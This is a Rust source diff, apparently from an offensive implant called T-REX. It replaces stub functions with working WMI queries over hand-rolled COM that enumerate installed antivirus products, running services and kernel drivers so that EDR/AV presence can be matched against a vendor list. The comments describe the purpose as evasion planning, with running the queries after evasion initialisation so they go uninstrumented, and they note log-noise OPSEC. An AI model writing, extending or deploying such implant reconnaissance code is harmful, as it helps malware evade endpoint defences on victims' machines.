@@ -165,12 +165,15 @@ pub struct KernelPosture {
 ///
 /// Set to `true` as of 2026-07-14: T0 (process enumeration via Toolhelp32) and
 /// T3 (service manager enumeration via SCM) are implemented with PEB-walk-
-/// resolved Win32 APIs. T1 (registry) and T2 (WMI) are still stubs.
-/// Mitigation queries (CFG/CET/DEP/ASLR) are also live.
+/// resolved Win32 APIs. T2 (WMI) landed 2026-07-18: `wmi_query_av_products`
+/// queries `root\SecurityCenter2:AntiVirusProduct` via hand-rolled COM (the
+/// `wmi`/`windows` crates are out — implant is no_std PIC), and
+/// `wmi_query_services`/`wmi_query_drivers` query `root\CIMV2`. T1 (registry)
+/// is still a stub. Mitigation queries (CFG/CET/DEP/ASLR) are also live.
 ///
-/// `assess_user_mode` will correctly detect EDR/AV products via process names
-/// and service names from the SCM. The Tier will be accurate — no more
-/// UNIMPLEMENTED banner.
+/// `assess_user_mode` will correctly detect EDR/AV products via process names,
+/// service names from the SCM, and WMI-registered AV products. The Tier will
+/// be accurate — no more UNIMPLEMENTED banner.
 const TREX_SCANNERS_IMPLEMENTED: bool = true;
 
 /// Run a full T0-T3 assessment (no kernel driver needed).
@@ -340,10 +343,14 @@ unsafe fn scan_service_registry(assessment: &mut TargetAssessment) {
 // ---- T2: WMI Query --------------------------------------------------------
 
 unsafe fn scan_wmi(assessment: &mut TargetAssessment) {
-    // WMI class: \\.\root\SecurityCenter2:AntiVirusProduct
-    // WMI class: \\.\root\CIMV2:Win32_Service (WHERE StartMode='Auto' AND State='Running')
-    // WMI class: \\.\root\CIMV2:Win32_SystemDriver
-    // Uses COM IWbemServices — medium noise
+    // T2 (low noise): three WQL queries via hand-rolled COM — see the
+    // wmi_query_* bodies below for the pipeline and OPSEC caveats.
+    //   - AntiVirusProduct  (root\SecurityCenter2) — primary AV detection
+    //   - Win32_Service     (root\CIMV2)           — running services
+    //   - Win32_SystemDriver(root\CIMV2)           — running kernel drivers
+    // The FFI primitives live in scanners.rs (CoInitializeEx → ConnectServer →
+    // ExecQuery → Next → Get). Call order matters: run after evasion init so
+    // the DCOM activation + ExecQuery are uninstrumented.
     wmi_query_av_products(assessment);
     wmi_query_services(assessment);
     wmi_query_drivers(assessment);
@@ -1112,9 +1119,307 @@ unsafe fn query_reg_value(_k: HKey, _name: &[u8]) -> &str {
     ""
 }
 
-unsafe fn wmi_query_av_products(_a: &mut TargetAssessment) {}
-unsafe fn wmi_query_services(_a: &mut TargetAssessment) {}
-unsafe fn wmi_query_drivers(_a: &mut TargetAssessment) {}
+// ---- T2: WMI queries (real implementation) ---------------------------------
+//
+// Hand-rolled COM pipeline (implant is no_std PIC — windows-rs/wmi crates are
+// out). scanners.rs owns the FFI primitives (CoInitializeEx, CoCreateInstance,
+// IWbemLocator::ConnectServer, IWbemServices::ExecQuery, IEnumWbemClassObject::
+// Next, IWbemClassObject::Get); this module wires them into three concrete
+// queries against the EDR-relevant WMI namespaces.
+//
+// What the pipeline does:
+//   1. CoInitializeEx(COINIT_MULTITHREADED)            — ole32 (force-loaded)
+//   2. CoCreateInstance(CLSID_WbemLocator, IID_IWbemLocator)
+//   3. locator->ConnectServer(ns, ...)                  → IWbemServices*
+//   4. CoSetProxyBlanket(services, PKT_PRIVACY)         — KB5004442 DCOM hardening
+//   5. services->ExecQuery(L"WQL", wql, RETURN|FORWARD) → IEnumWbemClassObject*
+//   6. loop { enum->Next(WBEM_INFINITE, 1, &obj)
+//             obj->Get(prop, 0, &variant)               → VT_BSTR
+//             VariantClear(variant); Release(obj) }
+//   7. Release(enum); Release(services); Release(locator)
+//
+// All BSTRs (namespace path, WQL text, property name) are wrapped via
+// SysAllocString and freed via SysFreeString. The property value BSTR lives
+// inside the VARIANT and is released by VariantClear.
+
+/// Run a WQL query in a WMI namespace, collecting one string property from
+/// each result object. Returns an empty Vec on any COM failure (we are a
+/// scanner — a failure is a "no data" result, not fatal).
+///
+/// `namespace`/`wql`/`prop_name` are ASCII byte slices; they are widened to
+/// UTF-16 (with a NUL terminator) on the stack, then wrapped as BSTRs.
+///
+/// Safety: COM is thread-affine — caller must invoke on the thread that
+/// called CoInitializeEx. T-REX is single-threaded so this holds.
+unsafe fn wmi_run_string_query(
+    namespace: &[u8],
+    wql: &[u8],
+    prop_name: &[u8],
+) -> Vec<String> {
+    let mut out: Vec<String> = Vec::new();
+
+    // 1. CoInitializeEx. Idempotent per-thread — return S_FALSE if already done.
+    if !scanners::co_init_succeeded(scanners::co_initialize_ex()) {
+        return out;
+    }
+
+    // 2. CoCreateInstance(CLSID_WbemLocator, IID_IWbemLocator) → IWbemLocator*.
+    let clsid = scanners::Guid::from_bytes(scanners::CLSID_WBEM_LOCATOR);
+    let iid = scanners::Guid::from_bytes(scanners::IID_IWBEM_LOCATOR);
+    let locator = scanners::co_create_instance(&clsid, &iid);
+    if locator.is_null() {
+        return out;
+    }
+
+    // 3. ConnectServer. Build the BSTR for the namespace path. Only the
+    //    namespace BSTR and the security-flags arg matter; the rest can be
+    //    null/zero (anonymous local auth, default locale, no WbemContext).
+    let ns_bstr = ascii_to_bstr(namespace);
+    if ns_bstr.is_null() {
+        scanners::com_release(locator);
+        return out;
+    }
+    let mut services: *mut c_void = core::ptr::null_mut();
+    let hr = scanners::wbem_locator_connect_server(
+        locator,
+        ns_bstr,
+        core::ptr::null_mut(),
+        core::ptr::null_mut(),
+        core::ptr::null_mut(),
+        0, // lSecurityFlags = 0 (no async connect)
+        core::ptr::null_mut(),
+        core::ptr::null_mut(),
+        &mut services,
+    );
+    scanners::sys_free_string(ns_bstr);
+    if hr < 0 || services.is_null() {
+        scanners::com_release(locator);
+        return out;
+    }
+
+    // 4. CoSetProxyBlanket — required by 2022 DCOM hardening. Without it,
+    //    ExecQuery fails with E_ACCESSDENIED on patched hosts. The locator
+    //    itself does not need a blanket (ConnectServer already succeeded).
+    //    RPC_C_AUTHN_LEVEL_PKT_PRIVACY (6) + RPC_C_IMP_LEVEL_IMPERSONATE (3).
+    let _ = scanners::co_set_proxy_blanket(
+        services,
+        scanners::RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
+        scanners::RPC_C_IMP_LEVEL_IMPERSONATE,
+    );
+
+    // 5. ExecQuery. Wrap "WQL" and the query text as BSTRs. RETURN_IMMEDIATELY
+    //    | FORWARD_ONLY = semisynchronous forward-only enumeration (cheap,
+    //    no cache to release, no blocking the provider host).
+    let lang_bstr = ascii_to_bstr(b"WQL");
+    let wql_bstr = ascii_to_bstr(wql);
+    if lang_bstr.is_null() || wql_bstr.is_null() {
+        scanners::sys_free_string(lang_bstr);
+        scanners::sys_free_string(wql_bstr);
+        scanners::com_release(services);
+        scanners::com_release(locator);
+        return out;
+    }
+    let mut enumerator: *mut c_void = core::ptr::null_mut();
+    let hr = scanners::wbem_services_exec_query(
+        services,
+        lang_bstr,
+        wql_bstr,
+        scanners::WBEM_QUERY_FLAGS,
+        core::ptr::null_mut(),
+        &mut enumerator,
+    );
+    scanners::sys_free_string(lang_bstr);
+    scanners::sys_free_string(wql_bstr);
+    if hr < 0 || enumerator.is_null() {
+        scanners::com_release(services);
+        scanners::com_release(locator);
+        return out;
+    }
+
+    // 6. Enumerator blanket — same reason as the services proxy.
+    let _ = scanners::co_set_proxy_blanket(
+        enumerator,
+        scanners::RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
+        scanners::RPC_C_IMP_LEVEL_IMPERSONATE,
+    );
+
+    // 7. Iterate. Fetch one object at a time; stop when Next returns fewer
+    //    than requested (WBEM_S_FALSE at end of result set) or an error.
+    //    Cap at 64 results — a real host has at most a handful of AV products
+    //    but Win32_Service can return thousands; we cap every query the same
+    //    way (the matcher below short-circuits EDR-named services anyway).
+    let prop_bstr = ascii_to_bstr(prop_name);
+    if prop_bstr.is_null() {
+        scanners::com_release(enumerator);
+        scanners::com_release(services);
+        scanners::com_release(locator);
+        return out;
+    }
+    let mut guard = 0u32;
+    loop {
+        if guard >= 64 {
+            break;
+        }
+        guard += 1;
+
+        let mut obj: *mut c_void = core::ptr::null_mut();
+        let mut returned: u32 = 0;
+        let hr = scanners::enum_wbem_next(
+            enumerator,
+            scanners::WBEM_INFINITE,
+            1,
+            &mut obj,
+            &mut returned,
+        );
+        if returned == 0 || obj.is_null() {
+            break; // WBEM_S_FALSE at end of set, or error — either way stop.
+        }
+        let _ = hr;
+
+        // Get the property as a VARIANT. For AntiVirusProduct.displayName and
+        // Win32_Service.Name the property is a VT_BSTR. If the provider
+        // returns a different type we just skip this row.
+        let mut variant = scanners::Variant::zero();
+        let hr = scanners::wbem_object_get(
+            obj,
+            prop_bstr,
+            0,
+            &mut variant,
+            core::ptr::null_mut(),
+            core::ptr::null_mut(),
+        );
+        if hr >= 0 {
+            let bstr = variant.bstr_ptr();
+            if !bstr.is_null() {
+                let name = scanners::wide_to_utf8(bstr);
+                out.push(name);
+            }
+        }
+        scanners::variant_clear(&mut variant);
+        scanners::com_release(obj);
+    }
+    scanners::sys_free_string(prop_bstr);
+
+    // 8. Tear down. Each Release drops a refcount; WMI provider objects free
+    //    themselves when their refcount hits zero.
+    scanners::com_release(enumerator);
+    scanners::com_release(services);
+    scanners::com_release(locator);
+
+    out
+}
+
+/// Wrap an ASCII byte slice as a BSTR (UTF-16 + 4-byte length prefix, owned by
+/// oleaut32). Returns a null BSTR on allocation failure. The caller MUST free
+/// it with sys_free_string. The NUL terminator is added here.
+unsafe fn ascii_to_bstr(ascii: &[u8]) -> *mut u16 {
+    if ascii.len() > 1024 {
+        // Sanity bound — no namespace/WQL/property we use is anywhere near this.
+        return core::ptr::null_mut();
+    }
+    // Build a NUL-terminated UTF-16 buffer on the stack (ASCII fits the low
+    // byte; this is the same convention scanners::wide_to_utf8 reverses).
+    let mut wide = [0u16; 1026];
+    let n = ascii.len().min(wide.len() - 1);
+    for i in 0..n {
+        wide[i] = ascii[i] as u16;
+    }
+    wide[n] = 0;
+    scanners::sys_alloc_string(wide.as_ptr())
+}
+
+/// T2: Query `root\SecurityCenter2:AntiVirusProduct` for AV/EDR products.
+///
+/// Many EDR/AV vendors register here (it is what the Windows Security Center
+/// UI reads). Consumer SKUs (Defender, McAfee, Norton, …) reliably populate
+/// it; some enterprise EDRs (SentinelOne older builds) omit it but register a
+/// service instead. We merge any hit into the assessment via match_process_name
+/// so the existing vendor DB classifies it.
+///
+/// NOTE: `root\SecurityCenter2` does NOT exist on Server SKUs (Security Center
+/// is client-only). ConnectServer will return WBEM_E_INVALID_NAMESPACE (0x8004100E)
+/// and the query is a no-op — that is expected, not a bug.
+unsafe fn wmi_query_av_products(a: &mut TargetAssessment) {
+    // displayName is the human-readable product name (e.g. "Windows Defender",
+    // "McAfee Endpoint Security"). productState/vendor are also available but
+    // displayName alone is enough to classify.
+    let names = wmi_run_string_query(
+        b"root\\SecurityCenter2",
+        b"SELECT displayName FROM AntiVirusProduct",
+        b"displayName",
+    );
+    for name in names.iter() {
+        if let Some(vendor) = match_process_name(name.as_str()) {
+            let product = DetectedProduct {
+                vendor,
+                product_name: vendor.default_name(),
+                detection_method: DetectionMethod::WMIAntivirusProduct,
+                process_count: 0,
+                driver_count: 0,
+                service_count: 0,
+            };
+            merge_or_push(&mut a.products, product);
+        }
+    }
+}
+
+/// T2: Query `root\CIMV2:Win32_Service` for service names. Cross-references
+/// the T1 (registry) and T3 (SCManager) scans — same vendor DB, but WMI sees
+/// services that registry scanning misses (delayed-start, driver-backed).
+/// Noisy (provider host logged), hence tier-2.
+unsafe fn wmi_query_services(a: &mut TargetAssessment) {
+    // Running + Auto-start services only. State/StartMode filtering keeps the
+    // result set (and the WmiPrvSE log noise) bounded; stopped/disabled EDR
+    // services are not interesting for evasion planning.
+    let names = wmi_run_string_query(
+        b"root\\CIMV2",
+        b"SELECT Name FROM Win32_Service WHERE State='Running'",
+        b"Name",
+    );
+    for name in names.iter() {
+        if let Some(vendor) = match_service_name(name.as_str()) {
+            let product = DetectedProduct {
+                vendor,
+                product_name: vendor.default_name(),
+                detection_method: DetectionMethod::ServiceName,
+                process_count: 0,
+                driver_count: 0,
+                service_count: 1,
+            };
+            merge_or_push(&mut a.products, product);
+        }
+    }
+}
+
+/// T2: Query `root\CIMV2:Win32_SystemDriver` for running kernel drivers. The
+/// driver names often differ from service names (e.g. CrowdStrike's `csagent`
+/// service ↔ `csagent` driver; SentinelOne's `SentinelMonitor` driver). This
+/// tier catches EDR minifilters / notification drivers the user-mode scanners
+/// cannot see. Lower value than AV products but cheap to run.
+unsafe fn wmi_query_drivers(a: &mut TargetAssessment) {
+    let names = wmi_run_string_query(
+        b"root\\CIMV2",
+        b"SELECT Name FROM Win32_SystemDriver WHERE State='Running'",
+        b"Name",
+    );
+    // No dedicated driver-name matcher exists in the vendor DB yet — reuse
+    // match_service_name (driver names like "csagent"/"SysmonDrv" match the
+    // same substrings). TODO: split match_service_name into match_driver_name
+    // once a driver-specific pattern set lands.
+    for name in names.iter() {
+        if let Some(vendor) = match_service_name(name.as_str()) {
+            let product = DetectedProduct {
+                vendor,
+                product_name: vendor.default_name(),
+                detection_method: DetectionMethod::DriverName,
+                process_count: 0,
+                driver_count: 1,
+                service_count: 0,
+            };
+            merge_or_push(&mut a.products, product);
+        }
+    }
+}
 unsafe fn query_system_module_info() -> *mut u8 {
     core::ptr::null_mut()
 }
